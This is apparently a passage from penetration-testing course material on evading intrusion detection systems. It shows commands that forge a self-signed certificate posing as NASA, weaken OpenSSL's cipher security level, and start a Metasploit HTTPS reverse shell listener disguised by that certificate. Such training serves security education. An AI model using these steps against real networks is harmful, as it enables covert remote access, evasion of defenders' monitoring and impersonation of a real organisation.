Traditionally, network Intrusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS) protect against incoming malicious traffic. However, they are often used to filter outgoing traffic. The main difference between these devices is that an IPS is an active device sitting in-line of the traffic and can block traffic, while a traditional IDS is a passive device which does not sit inline and is designed to only alert.

However, both devices will perform deep packet inspection. Large chunks of data are generally fragmented as they traverse the IP network, because some links have low Maximum Transmission Unit (MTU) values, which limits the size of packets that can be transferred over the network medium. This process is called IP fragmentation. Because of this fragmentation, IDS and IPS devices will first need to  packets to reconstruct the data. The devices will then examine the content of the traffic beyond IP addresses and port numbers, and inspect application layer data in search of identifiable patterns defined by signatures.

These signatures are often created by malware analysts using methods similar to antivirus signature creation and must be very specifically tuned for accuracy. This tuning process can work to our advantage, allowing us to evade detection by making very small changes to an otherwise suspicious traffic pattern.

# Custom Certificates
Manually create a self-signed certificate with openssl,535 which allows us full control over the certificate details. We don’t need to own a domain for this approach but if the certificate is passing through HTTPS inspection (which is covered later in this module), the traffic might flag because of an untrusted certificate.

However, despite the drawback of potential HTTP inspection flagging our traffic, we’ll try this approach and generate a new self-signed certificate and private key that appears to be from NASA. We’ll use several openssl options:
- req: Create a self-signed certificate.
- -new: Generate a new certificate.
- -x509: Output a self-signed certificate instead of a certificate request. 
- -nodes: Do not encrypt private keys.
- -out cert.crt: Output file for the certificate.
- -keyout priv.key: Output file for the private key.

Let’s put these options together and run the command.
```bash
kali@kali:~$ openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
Generating a RSA private key
...
writing new private key to 'priv.key'
...
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:TX
Locality Name (eg, city) []:Houston
Organization Name (eg, company) [Internet Widgits Pty Ltd]:NASA
Organizational Unit Name (eg, section) []:JSC
Common Name (e.g. server FQDN or YOUR name) []:nasa.gov
Email Address []:info@nasa.gov
Listing 396 - Generating self signed certificate
```
In order to use this certificate and key with Metasploit, we must create a .pem file by simply concatenating the key and certificate with cat.
```bash
kali@kali:~$ cat priv.key cert.crt > nasa.pem
```

We also must change the CipherString536 in the /etc/ssl/openssl.cnf config file or our reverse HTTPS shell will not work properly. First, we will locate this line in the config file:
```
CipherString=DEFAULT@SECLEVEL=2
```

We will remove the “@SECLEVEL=2” string, as the SECLEVEL538 option limits the usable hash and cypher functions in an SSL or TLS connection. We’ll set this to “DEFAULT”, which allows all.

The new configuration should be set according to the listing below.
```
CipherString=DEFAULT
```

Finally, we’ll configure Metasploit to use our newly-created certificate through the HandlerSSLCert option, which we’ll set to the path of our nasa.pem file. Once this is set, we’ll restart our listener.
```bash
msf5 exploit(multi/handler) > set HandlerSSLCert /home/kali/self_cert/nasa.pem
handlersslcert => /home/kali/self_cert/nasa.pem
msf5 exploit(multi/handler) > exploit
[*] Started HTTPS reverse handler on https://192.168.119.120:4443
```